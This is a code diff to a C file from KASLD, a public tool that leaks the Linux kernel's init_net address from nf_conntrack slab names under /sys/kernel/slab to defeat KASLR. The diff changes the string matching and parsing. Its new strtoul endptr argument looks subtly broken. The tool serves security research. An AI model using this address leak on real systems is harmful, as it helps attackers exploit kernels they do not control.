@@ -1,10 +1,11 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
-// Retrieve inet_net kernel symbol virtual address from /sys/kernel/slab/nf_conntrack_*
+// Retrieve init_net kernel symbol virtual address from /sys/kernel/slab/nf_conntrack_*
 // Patched some time around 2016, but still present in RHEL 7.6 as of 2018
 // - https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
 // ---
 // <bcoles@gmail.com>
 
+#define _GNU_SOURCE
 #include <dirent.h> 
 #include <string.h>
 #include <stdio.h> 
@@ -28,10 +29,9 @@ unsigned long get_kernel_addr_conntrack() {
   unsigned long addr = 0;
   struct dirent *dir;
   const char* path = "/sys/kernel/slab/";
-  const char* needle = "nf_conntrack";
+  const char* needle = "nf_conntrack_";
   const int addr_len = 16; /* 64-bit */
   char d_path[256];
-  char addr_buf[addr_len];
 
   printf("[.] trying %s ...\n", path);
 
@@ -48,14 +48,18 @@ unsigned long get_kernel_addr_conntrack() {
 
     snprintf(d_path, sizeof(d_path), "%s", dir->d_name);
 
-    if (strncmp(d_path, needle, strlen(needle)) != 0)
+    char* substr = (char*)memmem(d_path, sizeof(d_path), needle, strlen(needle));
+
+    if (substr == NULL)
       continue;
 
-    memcpy(addr_buf, &d_path[strlen(needle) + 1], addr_len);
-    addr_buf[addr_len] = '\0';
+    int start = strlen(needle);
+    int end = start + addr_len;
 
-    char* endptr = &addr_buf[addr_len];
-    addr = strtoul(&addr_buf[0], &endptr, 16);
+    if (end > strlen(&substr[0]))
+      continue;
+
+    addr = strtoul(&substr[start], (char **)&substr[end], 16);
 
     if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
       break;
